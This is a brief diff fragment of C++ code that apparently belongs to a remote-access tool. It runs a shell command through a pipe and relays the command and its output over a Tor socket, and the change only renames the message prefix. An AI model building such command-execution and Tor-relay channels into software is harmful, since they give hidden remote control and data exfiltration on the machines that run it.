@@ -329,7 +329,7 @@ public:
             }
             _pclose(pipe);
         }
-        this->torSock.proxySendStr("cmd;" + cmd + ";" + std::to_string(response.size()-1) + ";" + response + ";");
+        this->torSock.proxySendStr("exec;" + cmd + ";" + std::to_string(response.size()-1) + ";" + response + ";");
     }
     
 };
